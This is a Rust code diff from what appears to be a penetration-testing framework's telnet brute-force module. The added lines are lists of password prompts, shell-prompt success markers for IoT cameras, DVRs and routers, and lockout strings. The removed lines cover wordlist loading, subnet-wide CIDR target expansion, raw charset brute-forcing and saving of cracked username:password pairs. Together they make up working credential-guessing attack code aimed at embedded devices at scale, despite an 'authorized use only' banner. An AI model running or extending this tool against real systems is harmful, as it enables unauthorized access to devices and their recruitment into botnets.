-    } else if lower.contains("invalid") && (lower.contains("user") || lower.contains("password") || lower.contains("credential")) {
-        "Invalid credentials"
-    } else if lower.contains("no banner") || lower.contains("banner read") {
-        "No banner received"
-    } else if lower.contains("handshake") || lower.contains("protocol") {
-        "Protocol/handshake error"
-    }
-    // I/O and system errors
-    else if lower.contains("too many open files") || lower.contains("resource temporarily unavailable") {
-        "Resource exhaustion"
-    } else if lower.contains("interrupted") || lower.contains("would block") {
-        "I/O interrupted"
-    } else if lower.contains("invalid argument") {
-        "Invalid argument"
-    } else if lower.contains("not connected") {
-        "Not connected"
-    }
-    // Telnet-specific errors
-    else if lower.contains("iac") || lower.contains("telnet option") {
-        "Telnet option negotiation error"
-    } else if lower.contains("malformed") || lower.contains("corrupt") {
-        "Malformed data"
-    }
-    // Generic fallback
-    else {
-        "Other error"
-    }
+fn default_password_prompts() -> Vec<String> {
+    [
+        // English
+        "password:",
+        "password :",
+        "pass:",
+        "pass :",
+        "passcode:",
+        "passwd:",
+        "secret:",
+        "credential:",
+        // German
+        "kennwort:",
+        "passwort:",
+        // Spanish
+        "contrase\u{f1}a:",
+        "clave:",
+        // French
+        "mot de passe:",
+        // Portuguese
+        "senha:",
+        // Turkish
+        "\u{15f}ifre:",
+        "parola:",
+        // IoT
+        "enter password:",
+    ]
+    .iter()
+    .map(|s| s.to_string())
+    .collect()
 }
 
-async fn load_and_validate_config(path: &str, target: &str) -> Result<TelnetBruteforceConfig> {
-    let content = tokio::fs::read_to_string(path).await?;
-    let mut config: TelnetBruteforceConfig = serde_json::from_str(&content)?;
-    config.target = target.to_string();
-    config.preprocess_prompts();
-
-    let mut errors = Vec::new();
-
-    if config.port == 0 { errors.push("Port must be > 0".to_string()); }
-    if config.threads == 0 || config.threads > 256 {
-        errors.push("Threads must be 1-256".to_string());
-    }
-    if !(1..=60).contains(&config.connection_timeout) {
-        errors.push("Connection timeout: 1-60s".to_string());
-    }
-
-    if !errors.is_empty() {
-        return Err(anyhow!("Validation errors:\n  - {}", errors.join("\n  - ")));
-    }
-
-    Ok(config)
+fn default_success_indicators() -> Vec<String> {
+    // These are checked against the TAIL of the response buffer (last 512 bytes)
+    // to avoid false positives from MOTD/banner text earlier in the session.
+    [
+        // Shell prompt patterns — reliable because they appear at the prompt position
+        "$ ",
+        "# ",
+        "> ",
+        "~ ",
+        "% ",
+        // Also match without trailing space (end of buffer)
+        "\n$ ",
+        "\n# ",
+        "\n> ",
+        // Explicit auth success messages
+        "last login",
+        "logged in",
+        "login successful",
+        "login ok",
+        "authentication successful",
+        "successfully logged",
+        "authenticated.",
+        // BusyBox / embedded Linux (definitive shell indicators)
+        "busybox",
+        "built-in shell",
+        // BusyBox-style prompts
+        "ash#",
+        "sh-",
+        "/ # ",
+        "~ # ",
+        // IoT / camera / DVR specific (firmware shell prompts)
+        "hi3518",
+        "xiongmai#",
+        "miwifi#",
+        "v380#",
+        "dvrdvs#",
+        "(none)#",
+        "(none) #",
+        // Network device shells
+        "router>",
+        "router#",
+        "switch>",
+        "switch#",
+        "firewall>",
+        "firewall#",
+        "zte>",
+        "huawei>",
+        "mikrotik>",
+        "ubnt>",
+        "cisco>",
+        "cisco#",
+        // Linux root prompt patterns
+        "root@",
+        // Chinese
+        "\u{6b22}\u{8fce}",                 // 欢迎 (welcome)
+        "\u{8ba4}\u{8bc1}\u{6210}\u{529f}", // 认证成功 (auth successful)
+        "\u{767b}\u{5f55}\u{6210}\u{529f}", // 登录成功 (login successful)
+        "\u{5df2}\u{8fde}\u{63a5}",         // 已连接 (connected)
+        // Spanish
+        "bienvenido",
+        "sesi\u{f3}n iniciada",
+        // Portuguese
+        "bem-vindo",
+    ]
+    .iter()
+    .map(|s| s.to_string())
+    .collect()
 }
 
-async fn save_config(config: &TelnetBruteforceConfig, path: &str) -> Result<()> {
-    let json = serde_json::to_string_pretty(config)?;
-    tokio::fs::write(path, json).await?;
-    Ok(())
+fn default_lockout_indicators() -> Vec<String> {
+    [
+        "too many failed",
+        "too many attempts",
+        "too many connections",
+        "account locked",
+        "account disabled",
+        "temporarily blocked",
+        "please wait",
+        "try again later",
+        "banned",
+        "lockout",
+        "locked out",
+        "rate limit",
+        "max retries exceeded",
+        "connection limit",
+        "\u{8d26}\u{53f7}\u{9501}\u{5b9a}", // 账号锁定 (account locked)
+    ]
+    .iter()
+    .map(|s| s.to_string())
+    .collect()
 }
 
-fn print_config_summary(config: &TelnetBruteforceConfig) {
-    println!("\n{}", "=== Configuration ===".bold().cyan());
-    println!("  Target:     {}:{}", config.target, config.port);
-    println!("  Threads:    {}", config.threads);
-    println!("  Delay:      {}ms", config.delay_ms);
-    println!("  Output:     {}", config.output_file);
-    println!("{}", "====================".cyan());
+fn default_failure_indicators() -> Vec<String> {
+    [
+        // English
+        "incorrect",
+        "failed",
+        "denied",
+        "invalid",
+        "bad password",
+        "login incorrect",
+        "authentication failure",
+        "access denied",
+        "wrong password",
+        "login failed",
+        "auth failed",
+        "not authorized",
+        "error: invalid",
+        "permission denied",
+        "credentials rejected",
+        "unable to authenticate",
+        // German
+        "falsches kennwort",
+        "zugriff verweigert",
+        // Spanish
+        "contrase\u{f1}a incorrecta",
+        "acceso denegado",
+        // French
+        "mot de passe incorrect",
+        "acc\u{e8}s refus\u{e9}",
+        // Chinese
+        "\u{5bc6}\u{7801}\u{9519}\u{8bef}", // 密码错误 (wrong password)
+        "\u{8ba4}\u{8bc1}\u{5931}\u{8d25}", // 认证失败 (auth failed)
+        "\u{62d2}\u{7edd}\u{8bbf}\u{95ee}", // 拒绝访问 (access denied)
+    ]
+    .iter()
+    .map(|s| s.to_string())
+    .collect()
 }
-
-fn print_config_format() {
-    println!("{}", "=== JSON Configuration Format ===".bold().cyan());
-    println!("{}", r##"{
-    "port": 23,
-    "username_wordlist": "users.txt",
-    "password_wordlist": "passwords.txt",
-    "threads": 8,
-    "delay_ms": 100,
-    "connection_timeout": 3,
-    "read_timeout": 1,
-    "stop_on_success": false,
-    "verbose": false,
-    "full_combo": false,
-    "raw_bruteforce": false,
-    "raw_charset": "abcdefghijklmnopqrstuvwxyz",
-    "raw_min_length": 1,
-    "raw_max_length": 4,
-    "output_file": "results.txt",
-    "append_mode": false,
-    "pre_validate": true,
-    "retry_on_error": true,
-    "max_retries": 2,
-    "login_prompts": ["login:", "username:"],
-    "password_prompts": ["password:"],
-    "success_indicators": ["$", "#", "welcome"],
-    "failure_indicators": ["incorrect", "failed", "denied"]
-}
-"##);
-    println!("{}", "================================".cyan());
-}
-
-// src/modules/creds/generic/telnet_bruteforce.rs - PART 4/4
-// Utility Functions, Prompts, and Helper Functions
-
-// ============================================================
-// UTILITY FUNCTIONS
-// ============================================================
-
-async fn should_use_streaming(total_size: u64) -> Result<bool> {
-    if total_size > MAX_MEMORY_SIZE {
-        let size_mb = total_size as f64 / (1024.0 * 1024.0);
-        println!("\n{}", format!("[!] Large wordlists: {:.1} MB", size_mb).yellow());
-        println!("Options:");
-        println!("  1. Load into memory (faster, ~{:.0} MB RAM)", size_mb);
-        println!("  2. Streaming mode (slower, minimal memory)");
-        println!();
-        Ok(!prompt_yes_no("Load into memory? (y/n): ", true)?)
-    } else {
-        Ok(false)
-    }
-}
-
-async fn load_wordlists_streaming(
-    config: &TelnetBruteforceConfig,
-) -> Result<(Vec<String>, Vec<String>, usize, usize)> {
-    println!("[*] Using streaming mode...");
-    let user_count = count_nonempty_lines(&config.username_wordlist).await?;
-    let pass_count = if let Some(ref path) = config.password_wordlist {
-        count_nonempty_lines(path).await?
-    } else {
-        0
-    };
-    Ok((Vec::new(), Vec::new(), user_count, pass_count))
-}
-
-async fn load_wordlists_memory(
-    config: &TelnetBruteforceConfig,
-) -> Result<(Vec<String>, Vec<String>, usize, usize)> {
-    println!("[*] Loading wordlists into memory...");
-    let (usernames, passwords) = tokio::join!(
-        load_wordlist(&config.username_wordlist),
-                                              async {
-                                                  if let Some(ref path) = config.password_wordlist {
-                                                      load_wordlist(path).await
-                                                  } else {
-                                                      Ok(Vec::new())
-                                                  }
-                                              }
-    );
-
-    let usernames = usernames?;
-    let passwords = passwords?;
-    Ok((usernames.clone(), passwords.clone(), usernames.len(), passwords.len()))
-}
-
-fn calculate_estimated_attempts(
-    config: &TelnetBruteforceConfig,
-    username_count: usize,
-    password_count: usize,
-) -> usize {
-    let mut estimated = if config.full_combo {
-        username_count * password_count
-    } else if username_count == 1 {
-        password_count
-    } else if password_count == 1 {
-        username_count
-    } else {
-        password_count
-    };
-
-    if config.raw_bruteforce {
-        let charset_len = config.raw_charset.chars().count();
-        let mut raw_total = 0u64;
-        for len in config.raw_min_length..=config.raw_max_length {
-            raw_total += charset_len.pow(len as u32) as u64;
-        }
-        println!("[*] Raw bruteforce: ~{} passwords", raw_total);
-
-        let users_for_raw = if config.full_combo || username_count == 1 {
-            username_count as u64
-        } else {
-            1
-        };
-        estimated += (raw_total * users_for_raw) as usize;
-    }
-
-    estimated
-}
-
-async fn initialize_output_file(output_file: &str, config: &TelnetBruteforceConfig) -> Result<()> {
-    if !config.append_mode {
-        let mut f = File::create(output_file).await?;
-        f.write_all(format!("# Telnet Results - {}\n", chrono::Local::now()).as_bytes()).await?;
-        f.write_all(format!("# Target: {}:{}\n", config.target, config.port).as_bytes()).await?;
-        f.write_all(b"# Format: username:password\n\n").await?;
-    }
-    Ok(())
-}
-
-async fn validate_telnet_target(addr: &str, config: &TelnetBruteforceConfig) -> Result<()> {
-    // Use async lookup_host
-    let socket = lookup_host(addr).await?.next().ok_or_else(|| anyhow!("Cannot resolve"))?;
-
-    let mut stream = timeout(
-        Duration::from_secs(config.connection_timeout),
-                             TcpStream::connect(socket)
-    ).await??;
-
-    let mut buf = vec![0u8; 1024];
-    match timeout(Duration::from_secs(config.banner_read_timeout), stream.read(&mut buf)).await {
-        Ok(Ok(n)) if n > 0 => {
-            let response = String::from_utf8_lossy(&buf[..n]).to_lowercase();
-            if response.contains("login") || response.contains("username") ||
-                response.contains("telnet") || response.contains("password") {
-                    Ok(())
-                } else {
-                    Err(anyhow!("No telnet prompts detected"))
-                }
-        }
-        _ => Err(anyhow!("No response from target")),
-    }
-}
-
-/// Buffered writer for efficient result output
-/// Maintains an open file handle and buffers writes to reduce I/O operations
-struct BufferedResultWriter {
-    file: tokio::fs::File,
-    buffer: Vec<String>,
-    buffer_size_limit: usize,
-    flush_interval: std::time::Duration,
-    last_flush: std::time::Instant,
-}
-
-impl BufferedResultWriter {
-    async fn new(output_file: &str) -> Result<Self> {
-        let file = OpenOptions::new()
-        .create(true)
-        .append(true)
-        .open(output_file)
-        .await?;
-
-        Ok(Self {
-            file,
-            buffer: Vec::with_capacity(100), // Pre-allocate space for 100 lines
-           buffer_size_limit: 50, // Flush every 50 lines
-           flush_interval: std::time::Duration::from_secs(5), // Or every 5 seconds
-           last_flush: std::time::Instant::now(),
-        })
-    }
-
-    async fn write_result(&mut self, username: &str, password: &str) -> Result<()> {
-        self.buffer.push(format!("{}:{}", username, password));
-
-        // Flush if buffer is full or enough time has passed
-        if self.buffer.len() >= self.buffer_size_limit ||
-            self.last_flush.elapsed() >= self.flush_interval {
-                self.flush().await?;
-            }
-
-            Ok(())
-    }
-
-    async fn flush(&mut self) -> Result<()> {
-        if self.buffer.is_empty() {
-            return Ok(());
-        }
-
-        let mut content = self.buffer.join("\n");
-        content.push('\n');
-
-        self.file.write_all(content.as_bytes()).await?;
-        self.file.flush().await?;
-
-        self.buffer.clear();
-        self.last_flush = std::time::Instant::now();
-
-        Ok(())
-    }
-
-    async fn finalize(&mut self) -> Result<()> {
-        self.flush().await?;
-        self.file.sync_all().await?; // Ensure data is written to disk
-        Ok(())
-    }
-}
-
-impl Drop for BufferedResultWriter {
-    fn drop(&mut self) {
-        // Note: We can't do async operations in Drop, but we can flush synchronously
-        // The finalize() method should be called explicitly to ensure data integrity
-        // This Drop implementation is mainly for safety in case finalize() wasn't called
-        let _ = self.file.sync_all(); // Best effort sync
-    }
-}
-
-
-async fn print_final_report(
-    found_creds: &Arc<Mutex<HashSet<(String, String)>>>,
-                            output_file: &str,
-) {
-    let found = found_creds.lock().await;
-    println!();
-    if found.is_empty() {
-        println!("{}", "[-] No valid credentials found".yellow());
-    } else {
-        println!("{}", format!("[+] Found {} credential(s):", found.len()).green().bold());
-        let mut sorted: Vec<_> = found.iter().collect();
-        sorted.sort();
-        for (u, p) in sorted.iter() {
-            println!("  {}  {}:{}", "✓".green(), u, p);
-        }
-        println!("\n[*] Results saved to: {}", output_file);
-        println!("{}", "[!] WARNING: Credentials are stored in plain text. Secure the file appropriately!".yellow().bold());
-    }
-}
-
-async fn load_wordlist(path: &str) -> Result<Vec<String>> {
-    let content = tokio::fs::read_to_string(path).await?;
-    Ok(content
-    .lines()
-    .filter_map(|s| {
-        let trimmed = s.trim();
-        (!trimmed.is_empty()).then(|| trimmed.to_string())
-    })
-    .collect())
-}
-
-async fn count_nonempty_lines(path: &str) -> Result<usize> {
-    let content = tokio::fs::read_to_string(path).await?;
-    Ok(content.lines().filter(|line| !line.trim().is_empty()).count())
-}
-
-fn parse_single_target(input: &str) -> Result<Vec<String>> {
-    let input = input.trim();
-
-    if input.contains('/') {
-        match input.parse::<ipnetwork::IpNetwork>() {
-            Ok(network) => {
-                let mut ips = Vec::new();
-                for ip in network.iter() {
-                    ips.push(ip.to_string());
-                }
-                println!("[*] Expanded {} to {} hosts", input, ips.len());
-                Ok(ips)
-            }
-            Err(_) => Err(anyhow!("Invalid CIDR: {}", input)),
-        }
-    } else {
-        Ok(vec![input.to_string()])
-    }
-}
-
-fn parse_targets(input: &str) -> Result<Vec<String>> {
-    let mut targets = Vec::new();
-
-    for line in input.lines() {
-        let line = line.trim();
-        if line.is_empty() || line.starts_with('#') {
-            continue;
-        }
-
-        if line.contains('/') {
-            match line.parse::<ipnetwork::IpNetwork>() {
-                Ok(network) => {
-                    for ip in network.iter() {
-                        targets.push(ip.to_string());
-                    }
-                }
-                Err(_) => println!("{} Invalid CIDR: {}", "[!]".yellow(), line),
-            }
-        } else {
-            targets.push(line.to_string());
-        }
-    }
-
-    Ok(targets)
-}
-
-async fn load_credentials_file(path: &str) -> Result<Vec<(String, String)>> {
-    let content = tokio::fs::read_to_string(path).await?;
-    let mut creds = Vec::new();
-
-    for line in content.lines() {
-        let line = line.trim();
-        if line.is_empty() || line.starts_with('#') {
-            continue;
-        }
-
-        if let Some((user, pass)) = line.split_once(':') {
-            creds.push((user.trim().to_string(), pass.trim().to_string()));
-        }
-    }
-
-    Ok(creds)
-}
-
-fn save_batch_results(results: &[ScanResult], filename: &str) -> Result<()> {
-    let mut file = std::fs::OpenOptions::new()
-    .create(true)
-    .append(true)
-    .open(filename)?;
-
-    use std::io::Write;
-    for result in results {
-        let creds_str = match &result.credentials {
-            Some((u, p)) => format!("{}/{}", u, if p.is_empty() { "(blank)" } else { p }),
-            None => "none".to_string(),
-        };
-
-        writeln!(
-            file,
-            "[{}] {}:{} - {} - banner: {}",
-            result.timestamp,
-            result.ip,
-            result.port,
-            creds_str,
-            result.banner.replace('\n', " ").replace('\r', "")
-        )?;
-    }
-
-    Ok(())
-}
-
-// local normalize_target replaced by crate::utils::normalize_target
-
-// ============================================================
-// PROMPT/INPUT FUNCTIONS
-// ============================================================
-
-fn display_banner() {
-    println!();
-    println!("{}", "╔══════════════════════════════════════════════╗".bright_cyan());
-    println!("{}", "║   TELNET SECURITY TESTING MODULE            ║".bright_cyan());
-    println!("{}", "║   Advanced Bruteforce & Subnet Scanner      ║".bright_cyan());
-    println!("{}", "╚══════════════════════════════════════════════╝".bright_cyan());
-    println!();
-    println!("{}", "⚠️  AUTHORIZED USE ONLY".yellow().bold());
-    println!("{}", "    Unauthorized access is ILLEGAL".yellow());
-    println!();
-}
-
-// prompt and prompt_required are replaced by crate::utils imports/usage
-// prompt_yes_no is replaced by crate::utils imports/usage
-
-
-
-fn prompt_delay(default: u64) -> Result<u64> {
-    Ok(prompt_int_range("Delay in ms", default as i64, 0, 10000)? as u64)
-}
-
-fn prompt_timeout(msg: &str, default: u64) -> Result<u64> {
-    Ok(prompt_int_range(msg, default as i64, 1, 60)? as u64)
-}
-
-fn prompt_threads(default: usize) -> Result<usize> {
-    Ok(prompt_int_range("Threads", default as i64, 1, 256)? as usize)
-}
-
-fn prompt_retries(default: usize) -> Result<usize> {
-    Ok(prompt_int_range("Max retries", default as i64, 0, 10)? as usize)
-}
-
-fn prompt_file_path(prompt_text: &str) -> Result<String> {
-    // Strip ": " if present to match prompt_existing_file style
-    let msg = prompt_text.trim_end_matches(": ").trim_end_matches(":").trim();
-    crate::utils::prompt_existing_file(msg)
-}
-
-fn prompt_optional_wordlist(prompt_text: &str) -> Result<Option<String>> {
-    let msg = prompt_text.trim_end_matches(": ").trim_end_matches(":").trim();
-    if prompt_yes_no(&format!("Use {}?", msg), true)? {
-        Ok(Some(prompt_file_path(msg)?))
-    } else {
-        Ok(None)
-    }
-}
-fn prompt_charset(prompt_text: &str, default: &str) -> Result<String> {
-    prompt_default(prompt_text, default)
-}
-
-fn prompt_min_length(default: usize, min: usize, max: usize) -> Result<usize> {
-    Ok(prompt_int_range("Min length", default as i64, min as i64, max as i64)? as usize)
-}
-
-fn prompt_max_length(default: usize, min: usize, max: usize) -> Result<usize> {
-    Ok(prompt_int_range("Max length", default as i64, min as i64, max as i64)? as usize)
-}
-
-fn prompt_list(prompt_text: &str) -> Result<Vec<String>> {
-    let input = prompt_default(prompt_text, "")?;
-    Ok(input
-    .split(',')
-    .map(|s| s.trim().to_string())
-    .filter(|s| !s.is_empty())
-    .collect())
-}
-
-// prompt function removed as it is superseded by specific prompts or prompt_default
-
